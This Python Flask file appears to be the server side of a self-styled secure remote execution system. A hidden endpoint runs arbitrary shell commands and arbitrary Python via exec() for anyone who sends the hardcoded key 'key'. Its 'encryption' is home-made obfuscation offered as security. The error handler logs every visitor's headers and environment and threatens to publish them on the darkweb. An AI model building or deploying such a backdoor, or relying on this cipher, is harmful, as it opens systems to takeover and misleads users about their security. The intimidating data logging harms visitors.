# Encrypted Secure Remote Virtual System (ESRVS) (Esir Vezir)
# Server Code

from flask import Flask, request
import json
import random
class Combiner:
	def __init__(self):
		pass
	def combine(self, target, count):
		target = list(target)
		new = target.copy()
		newtarget = target.copy()
		while len(new) < count:
			newpart = []
			for comb1 in newtarget:
				if len(newpart)+len(new) >= count:
					break
				for comb2 in target:
					newpart.append(comb1+comb2)
					if len(newpart)+len(new) >= count:
						break
			newtarget = newpart.copy()
			new += newpart.copy()
			if len(new) >= count:
				break
		return new[:count]
class ShieldKEY: # Shield Kryptographic Engine for Yield
	def __init__(self, chars="qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890@#₺_&-+()/*:;!?<>{}[]"):
		self.main_chars = chars
		self.splitter = chars[0]
		chars = chars[1:]
		self.chars = Combiner().combine(chars, 1114112)
	def encode(self, text):
		new = []
		for h in text:
			i = ord(h)
			new.append(self.chars[i%1114112])
		new = self.splitter.join(new)
		newt = ""
		n = 8264
		for h in new:
			i = (self.main_chars.index(h)-71)+n
			if n%2 == 0:
				n += 293
			else:
				n -= 293
			newt += self.main_chars[i%len(self.main_chars)]
		return newt
	def decode(self, text):
		newt = ""
		n = 8264
		for h in text:
			i = (self.main_chars.index(h)-n)+71
			if n%2 == 0:
				n += 293
			else:
				n -= 293
			newt += self.main_chars[i%len(self.main_chars)]
		text = newt
		new = ""
		for h in text.split(self.splitter):
			new += chr(self.chars.index(h))
		return new
	def convert(self, number, key, gn):
		algo = ((key+gn)**2)%4
		if algo == 0:
			return (number+key)-gn
		elif algo == 1:
			return (number+gn)-key
		elif algo == 2:
			return (number*key)+gn
		else:
			return (number*gn)+key
	def unconvert(self, number, key, gn):
		algo = ((key+gn)**2)%4
		if algo == 0:
			return (number+gn)-key
		elif algo == 1:
			return (number+key)-gn
		elif algo == 3:
			return (number-gn)/key
		else:
			return (number-key)/gn
	def convert_key(self, key):
		newkey = 0
		gn = 1847
		for h in str(key):
			newkey += (ord(h)*1934)-len(str(key))
			if gn%2 == 0:
				gn += ((ord(h)+1847)-len(str(key)))*7200
			else:
				gn -= ((ord(h)-1847)+len(str(key)))*3450
		if newkey%2 == 0:
			newkey = -newkey
		if gn%2 == 0:
			gn = -gn
		return newkey, gn
	def encrypt(self, text, key):
		newkey, gn = self.convert_key(key)
		newtext = ""
		for h in text:
			newtext += chr(self.convert(ord(h), newkey, gn)%1114112)
			if gn%2 == 0:
				gn += len(str(key))*8274
			else:
				gn += len(str(key))*2648
		return newtext
	def decrypt(self, text, key):
		newkey, gn = self.convert_key(key)
		newtext = ""
		for h in text:
			newtext += chr(self.unconvert(ord(h), newkey, gn)%1114112)
			if gn%2 == 0:
				gn += len(str(key))*8274
			else:
				gn += len(str(key))*2648
		return newtext
	def hash(self, text):
		newtext = ""
		n = 826473
		for h in text:
			newtext += chr(self.convert(ord(h), ord(h)*30, ord(h)+283+n)%1114112)
			n += ord(h)
		return newtext
import subprocess, os, threading
keyengine = ShieldKEY()
rootkey = "key"
l = threading.Lock()
app = Flask(__name__)
@app.errorhandler(Exception)
def main_path(error):
	info = ""
	for head, value in request.headers.items():
		info += f"<p>{head}: {value}</p><br>"
	with open("humanlog.txt", "a") as f:
		f.write(f"{dict(request.headers)}\n{dict(request.environ)}\n{error}\n\n\n")
	return f"<h3>Welcome Human! Fuck off right now :) or we publish this information on darkweb.</h3><br>{info}"
@app.route("/secret/root/run", methods=["ESRVS"])
def run_path():
	global keyengine, rootkey, inputer
	try:
		data = request.get_json()
		content = keyengine.decode(data["content"])
		content = keyengine.decrypt(content, rootkey)
		content = json.loads(content)
		command = data["command"]
		if content["key"] == rootkey:
			if command == "command":
				result = subprocess.run(content["target"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, input=content["input"], text=True)
				output = result.stdout+result.stderr
				return keyengine.encode(keyengine.encrypt(output, rootkey))
			elif command == "python":
				try:
					with l:
						exec(content["target"])
					return keyengine.encode(keyengine.encrypt("Code executed successfuly.", rootkey))
				except Exception as e:
					return keyengine.encode(keyengine.encrypt(f"Error: {e}", rootkey))
		else:
			return keyengine.encode(keyengine.encrypt("Error: Key not found", rootkey))
	except Exception as e:
		return f"Error: {e}"
if __name__ == "__main__":
	app.run(debug=True)